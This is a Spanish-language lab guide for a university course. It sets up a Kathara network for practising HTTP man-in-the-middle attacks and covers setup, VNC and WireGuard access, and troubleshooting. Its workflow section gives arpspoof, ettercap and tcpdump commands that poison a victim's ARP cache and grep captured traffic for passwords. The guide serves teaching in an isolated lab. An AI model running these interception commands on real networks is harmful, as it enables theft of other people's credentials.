# Guía Completa - Practica 3 MITM HTTP

Navigation / Navegación: [Index](INDEX.md) | [Guide](README.md) | [Quickstart](QUICKSTART.md) | [Architecture](ARCHITECTURE.md) | [Network](NETWORK.md) | [Examples](EXAMPLES.md) | [Docker](DOCKER.md)

## Índice

1. [Descripción del escenario](#descripcion-del-escenario)
2. [Requisitos](#requisitos)
3. [Instalación](#instalacion)
4. [Uso](#uso)
5. [Flujo de trabajo MITM](#flujo-de-trabajo-mitm)
6. [Troubleshooting](#troubleshooting)
7. [Comandos útiles](#comandos-utiles)

## Descripción del escenario

Este escenario Kathara reproduce la **Práctica 3 MITM HTTP** originalmente diseñada para VNX. Permite practicar ataques Man-in-the-Middle sobre tráfico HTTP no cifrado.

### Topología

```
[victima:192.168.0.2]----+                                
                        |                                
[atacante:192.168.0.3]--+--[LAN:192.168.0.0/24]--[router]--[WAN:10.255.0.0/30]--[natgw]--> Internet
                        |    (Ubuntu GUI+VNC)      |                              (bridged)
[vpn:192.168.0.4]-------+                        (10.255.0.2/30)
(WireGuard)                                    (10.255.0.1/30)
```

### Componentes

| Nodo | Función | Características |
|---|---|---|
| **victima** | Objetivo del ataque | Ubuntu con LXQt, Firefox, VNC en :5901 |
| **atacante** | Agresor | Kali Linux CLI, herramientas pentesting, X11 forwarding |
| **router** | Enrutamiento | Conexión LAN-WAN |
| **natgw** | Salida a Internet | NAT + interfaz bridged |
| **vpn** | Acceso remoto | WireGuard server para conexión segura |

## Requisitos

### Software necesario

- **Docker** (con Docker Compose opcional)
- **Kathara Framework** (`pip install kathara`)
- **Cliente WireGuard** (macOS/Windows/Linux)
- **Cliente VNC** (TigerVNC, RealVNC, etc.)

### Requisitos de red

- Puerto UDP 51820 disponible (WireGuard)
- Conexión a Internet para descargar imágenes

### Recursos del sistema

| Recurso | Mínimo | Recomendado |
|---|---|---|
| RAM | 4 GB | 8 GB |
| Disco | 5 GB libres | 10 GB libres |
| CPU | 2 cores | 4 cores |

## Instalación

### 1. Clonar/Descargar el escenario

```bash
cd kathara_migration_p3
```

### 2. Construir imágenes Docker

Las imágenes personalizadas deben construirse antes del primer uso:

```bash
# Imagen VPN (WireGuard)
docker build -t kathara-vpn -f Dockerfile.vpn .

# Imagen desktop (Ubuntu GUI)
docker build -t kathara-desktop -f Dockerfile.desktop .
```

### 3. Preparar scripts

Hacer ejecutables los scripts de gestión:

```bash
chmod +x *.startup *.sh
```

### 4. Verificar instalación

```bash
# Verificar Docker
docker --version

# Verificar Kathara
kathara --version

# Verificar WireGuard
wg --version
```

## Uso

### Iniciar el laboratorio

#### Modo completo (recomendado)

```bash
./start-lab.sh
```

Este comando:
1. Verifica que las imágenes existan (o las construye)
2. Limpia laboratorios previos
3. Inicia todos los nodos
4. Configura WireGuard automáticamente
5. Ajusta el endpoint según el sistema operativo

#### Modo CLI-only (sin VPN)

```bash
./start-lab.sh --cli-only
```

Inicia solo: victima, atacante, router, natgw.  
Útil para desarrollo o cuando no se necesita acceso remoto.

### Conectar WireGuard

1. **Importar configuración:**
   - Localizar `./shared/vpn/student1.conf`
   - Importar en cliente WireGuard

2. **Activar túnel:**
   - El cliente obtiene IP `10.99.0.2/32`
   - Acceso a red `192.168.0.0/24`

3. **Verificar conexión:**
   ```bash
   ping 192.168.0.2
   ping 192.168.0.3
   ```

### Acceder a la víctima por VNC

```
Servidor: 192.168.0.2:5901
Password: password
Resolución: 1280x800
```

**Clientes recomendados:**
- **macOS:** TigerVNC Viewer, RealVNC
- **Windows:** RealVNC, TightVNC
- **Linux:** Remmina, TigerVNC

### Usar el atacante (CLI)

El atacante no tiene GUI nativa. Se accede mediante:

```bash
# Ejecutar comandos directamente
kathara exec -d "$(pwd)" atacante "comando"

# Obtener shell interactiva
kathara exec -d "$(pwd)" atacante "/bin/bash"
```

**Herramientas disponibles:**
- `ettercap` - Suite MITM completa
- `arpspoof` - Envenenamiento ARP
- `tcpdump` / `tshark` - Captura de tráfico
- `wireshark` - Análisis GUI (con X11 forwarding)
- `nmap` - Escaneo de redes
- `curl` / `wget` - Transferencia HTTP

### X11 Forwarding

Para usar aplicaciones gráficas desde el atacante:

```bash
# macOS (requiere XQuartz)
kathara exec -d "$(pwd)" atacante "DISPLAY=host.docker.internal:0 wireshark"

# Linux (X11 local)
kathara exec -d "$(pwd)" atacante "DISPLAY=$DISPLAY wireshark"
```

## Flujo de trabajo MITM

### Escenario típico: Captura de credenciales HTTP

1. **Preparación**
   ```bash
   ./start-lab.sh
   ./verify.sh
   ```

2. **Conexión**
   - Conectar WireGuard
   - Abrir VNC a víctima (192.168.0.2:5901)

3. **Configurar ataque**
   ```bash
   # Envenenar ARP (suplantar gateway)
   kathara exec -d "$(pwd)" atacante "arpspoof -i eth0 -t 192.168.0.2 192.168.0.1" &
   
   # Iniciar captura
   kathara exec -d "$(pwd)" atacante "tcpdump -i eth0 -w /shared/mitm.pcap"
   ```

4. **Generar tráfico**
   - En víctima (VNC): Abrir Firefox
   - Navegar a sitio HTTP vulnerable (ej: testphp.vulnweb.com)
   - Introducir credenciales de prueba

5. **Análisis**
   ```bash
   # Extraer credenciales
   kathara exec -d "$(pwd)" atacante "tcpdump -A -r /shared/mitm.pcap | grep -i 'password'"
   
   # O abrir en Wireshark del host
   wireshark ./shared/mitm.pcap
   ```

### Variantes del ataque

#### ARP Spoofing con ettercap

```bash
# Modo texto
kathara exec -d "$(pwd)" atacante "ettercap -T -q -M arp:remote /192.168.0.2// /192.168.0.1//"

# Con filtro de plugins
kathara exec -d "$(pwd)" atacante "ettercap -T -q -M arp:remote /192.168.0.2// /192.168.0.1// -P remote_browser"
```

#### Captura selectiva

```bash
# Solo tráfico HTTP
kathara exec -d "$(pwd)" atacante "tcpdump -i eth0 port 80 -w /shared/http.pcap"

# Solo POST requests (formularios)
kathara exec -d "$(pwd)" atacante "tcpdump -i eth0 -A | grep -E 'POST|password'"
```

#### Análisis en tiempo real

```bash
# Monitorizar tráfico HTTP en tiempo real
kathara exec -d "$(pwd)" atacante "tcpdump -i eth0 -A -l | grep -E 'POST|GET|Host|username|password'"
```

## Troubleshooting

### WireGuard no conecta

**Síntoma:** Túnel activo pero sin conectividad a LAN

**Solución:**
```bash
# Verificar estado
kathara exec -d "$(pwd)" vpn "wg show"

# Reiniciar con proxy UDP
./stop-lab.sh
./start-lab.sh --force-proxy
```

### VNC no responde

**Síntoma:** No se puede conectar a 192.168.0.2:5901

**Verificar:**
```bash
# Estado del servidor VNC
kathara exec -d "$(pwd)" victima "ss -tln | grep 5901"

# Reiniciar VNC
kathara exec -d "$(pwd)" victima "vncserver -kill :1; vncserver :1"
```

### Sin conectividad LAN

**Verificar rutas:**
```bash
./verify.sh --verbose

# En router
kathara exec -d "$(pwd)" router "ip route"
kathara exec -d "$(pwd)" router "cat /proc/sys/net/ipv4/ip_forward"
```

### Problemas de DNS

**Síntoma:** No resuelve nombres de dominio

**Verificar:**
```bash
kathara exec -d "$(pwd)" victima "cat /etc/resolv.conf"
kathara exec -d "$(pwd)" victima "nslookup google.com"
```

### El atacante no ve tráfico

**Verificar ARP spoofing:**
```bash
# En victima
kathara exec -d "$(pwd)" victima "arp -a"

# Debería mostrar la MAC del atacante para 192.168.0.1
```

## Comandos útiles

### Gestión del laboratorio

```bash
# Listar nodos
kathara linfo -d "$(pwd)"

# Ver logs
kathara linfo -d "$(pwd)" --logs

# Ejecutar en nodo específico
kathara exec -d "$(pwd)" victima "comando"

# Copiar archivos
kathara exec -d "$(pwd)" victima "cp /shared/archivo /destino/"
```

### Red y conectividad

```bash
# Ping entre nodos
kathara exec -d "$(pwd)" victima "ping -c 3 192.168.0.3"

# Traceroute
kathara exec -d "$(pwd)" victima "traceroute 8.8.8.8"

# Ver tabla ARP
kathara exec -d "$(pwd)" victima "arp -an"

# Capturar tráfico
kathara exec -d "$(pwd)" atacante "tcpdump -i eth0 -c 100"
```

### WireGuard

```bash
# Estado del servidor
kathara exec -d "$(pwd)" vpn "wg show"

# Ver configuración
kathara exec -d "$(pwd)" vpn "wg showconf"

# Reglas iptables
kathara exec -d "$(pwd)" vpn "iptables -t nat -L -v -n"
```

### VNC

```bash
# Procesos VNC
kathara exec -d "$(pwd)" victima "ps aux | grep vnc"

# Logs VNC
kathara exec -d "$(pwd)" victima "cat /root/.vnc/*.log"

# Cambiar resolución
kathara exec -d "$(pwd)" victima "vncserver -kill :1; vncserver :1 -geometry 1920x1080"
```

### Transferencia de archivos

```bash
# Host -> Contenedor
cp archivo_local ./shared/
kathara exec -d "$(pwd)" victima "ls /shared/"

# Contenedor -> Host
kathara exec -d "$(pwd)" atacante "cp /ruta/captura.pcap /shared/"
ls ./shared/
```

---

## Referencias

- [Kathara Documentation](https://github.com/KatharaFramework/Kathara/wiki)
- [WireGuard Documentation](https://www.wireguard.com/)
- [Ettercap Documentation](https://www.ettercap-project.org/)
- [Práctica original VNX](../practica3.xml)

## Licencia

Migración educativa desde VNX a Kathara - Universidad de Alcalá
